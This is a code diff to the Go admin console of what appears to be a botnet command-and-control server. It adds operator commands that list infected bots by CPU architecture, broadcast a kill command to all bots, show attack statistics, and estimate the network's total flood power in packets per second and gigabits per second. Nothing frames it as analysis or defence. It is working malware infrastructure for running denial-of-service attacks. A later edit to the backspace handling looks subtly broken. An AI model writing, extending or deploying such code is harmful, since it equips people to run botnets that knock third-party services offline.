@@ -191,7 +191,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
 			this.conn.Write([]byte("│        spoofed network - help menu                          │\r\n"))
 			this.conn.Write([]byte("├────── commands ──────────────────────────────────────────────┤\r\n"))
-			this.conn.Write([]byte("│ help, count, methods, adminhelp                            │\r\n"))
+			this.conn.Write([]byte("│ help, count, methods, bots, stats, attacknet, stop         │\r\n"))
 			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
 			continue
 		}
@@ -240,6 +240,90 @@ func (this *Admin) Handle() {
 			
 			continue
 		}
+
+		if cmd == "bots" {
+			this.conn.Write([]byte("\033[2J\033[1H"))
+			this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
+			this.conn.Write([]byte("│                    CONNECTED BOTS LIST                     │\r\n"))
+			this.conn.Write([]byte("├──────────────────────────────────────────────────────────────┤\r\n"))
+			
+			botCount := clientList.Count()
+			distribution := clientList.Distribution()
+			
+			if botCount == 0 {
+				this.conn.Write([]byte("│ No bots connected                                              │\r\n"))
+			} else {
+				for arch, count := range distribution {
+					this.conn.Write([]byte(fmt.Sprintf("│ %-20s: %-10d bots                    │\r\n", arch, count)))
+				}
+			}
+			
+			this.conn.Write([]byte(fmt.Sprintf("├──────────────────────────────────────────────────────────────┤\r\n")))
+			this.conn.Write([]byte(fmt.Sprintf("│ Total: %-10d bots connected                        │\r\n", botCount)))
+			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
+			continue
+		}
+
+		if cmd == "stop" {
+			this.conn.Write([]byte("Stopping all attacks...\r\n"))
+			// отправляем kill команду всем ботам
+			killCmd := []byte{0x00, 0x00, 0x03}
+			clientList.QueueBuf(killCmd, -1, "")
+			this.conn.Write([]byte("All attacks stopped\r\n"))
+			continue
+		}
+
+		if cmd == "stats" {
+			this.conn.Write([]byte("\033[2J\033[1H"))
+			this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
+			this.conn.Write([]byte("│                    SPOOFED NETWORK STATS                    │\r\n"))
+			this.conn.Write([]byte("├──────────────────────────────────────────────────────────────┤\r\n"))
+			
+			botCount := clientList.Count()
+			distribution := clientList.Distribution()
+			activeAttacks := database.fetchRunningAttacks()
+			totalAttacks := database.fetchAttacks()
+			
+			// статистика по архитектурам
+			for arch, count := range distribution {
+				this.conn.Write([]byte(fmt.Sprintf("│ %-20s: %-10d bots                    │\r\n", arch, count)))
+			}
+			
+			this.conn.Write([]byte("├──────────────────────────────────────────────────────────────┤\r\n"))
+			this.conn.Write([]byte(fmt.Sprintf("│ Total Bots: %-10d                                │\r\n", botCount)))
+			this.conn.Write([]byte(fmt.Sprintf("│ Active Attacks: %-10d                        │\r\n", activeAttacks)))
+			this.conn.Write([]byte(fmt.Sprintf("│ Total Attacks: %-10d                         │\r\n", totalAttacks)))
+			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
+			continue
+		}
+
+		if cmd == "attacknet" {
+			this.conn.Write([]byte("\033[2J\033[1H"))
+			this.conn.Write([]byte("\x1b[1;31m┌──────────────────────────────────────────────────────────────┐\r\n"))
+			this.conn.Write([]byte("\x1b[1;31m│                    NETWORK ATTACK POWER                    │\r\n"))
+			this.conn.Write([]byte("\x1b[1;31m├──────────────────────────────────────────────────────────────┤\r\n"))
+			
+			botCount := clientList.Count()
+			
+			// расчет мощности сети
+			avgPps := 50000 // средний pps на бота
+			avgBandwidth := 100 // средний мбит/с на бота
+			
+			totalPps := botCount * avgPps
+			totalBandwidth := botCount * avgBandwidth
+			totalGbps := float64(totalBandwidth) / 1000.0
+			
+			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Bots:        \x1b[1;36m%-10d bots                    \x1b[1;31m│\r\n", botCount)))
+			this.conn.Write([]byte("\x1b[1;31m├──────────────────────────────────────────────────────────────┤\r\n"))
+			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mNetwork Power:     \x1b[1;32m%-10d PPS                     \x1b[1;31m│\r\n", totalPps)))
+			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Bandwidth:   \x1b[1;32m%-10d Mbps                    \x1b[1;31m│\r\n", totalBandwidth)))
+			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Bandwidth:   \x1b[1;32m%-10.2f Gbps                    \x1b[1;31m│\r\n", totalGbps)))
+			this.conn.Write([]byte("\x1b[1;31m├──────────────────────────────────────────────────────────────┤\r\n"))
+			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mActive Attacks:    \x1b[1;33m%-10d attacks                 \x1b[1;31m│\r\n", database.fetchRunningAttacks())))
+			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m│ \x1b[1;37mTotal Attacks:     \x1b[1;33m%-10d attacks                 \x1b[1;31m│\r\n", database.fetchAttacks())))
+			this.conn.Write([]byte("\x1b[1;31m└──────────────────────────────────────────────────────────────┘\x1b[0m\r\n"))
+			continue
+		}
 		
 		if userInfo.admin == 1 && cmd == "adminhelp" {
 			this.conn.Write([]byte("\033[2J\033[1H"))
@@ -252,6 +336,10 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15madminlogs     Clear attack logs       \x1b[38;5;208m│\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mselfupdate    Execute bash script     \x1b[38;5;208m│\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mcount         Show bot count          \x1b[38;5;208m│\r\n"))
+			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mbots          List connected bots     \x1b[38;5;208m│\r\n"))
+			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mstop          Stop all attacks        \x1b[38;5;208m│\r\n"))
+			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mstats         Network statistics       \x1b[38;5;208m│\r\n"))
+			this.conn.Write([]byte("\x1b[38;5;208m│ \x1b[38;5;15mattacknet     Attack power stats      \x1b[38;5;208m│\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;208m└──────────────────────────────────────────────┘\r\n"))
 			continue
 		}
@@ -477,7 +565,7 @@ func (this *Admin) Handle() {
 
 		atk, err := NewAttack(cmd, userInfo.admin)
 		if err != nil {
-			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
+			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s is not a valid command!\033[0m\r\n", cmd)))
 		} else {
 			buf, err := atk.Build()
 			if err != nil {
@@ -516,6 +604,7 @@ func (this *Admin) ReadLine(masked bool) (string, error) {
 				this.conn.Write([]byte("\b \b"))
 				bufPos--
 			}
+			bufPos--
 		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
 			bufPos--
 		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
